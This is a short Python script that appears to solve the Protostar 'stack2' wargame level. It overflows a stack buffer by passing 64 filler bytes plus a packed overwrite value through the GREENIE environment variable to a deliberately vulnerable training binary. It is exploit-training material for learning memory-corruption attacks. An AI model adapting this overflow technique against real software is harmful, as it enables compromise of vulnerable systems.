#!/usr/bin/python

import subprocess
import os
import struct

# return the little endian byte ordering for x
def p32(x):
	return struct.pack('<I',x)

payload = "A" * 64 + p32(0x0d0a0d0a)

p = subprocess.Popen(["/opt/protostar/bin/stack2"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=dict(os.environ, GREENIE=payload))
print p.communicate()[0]
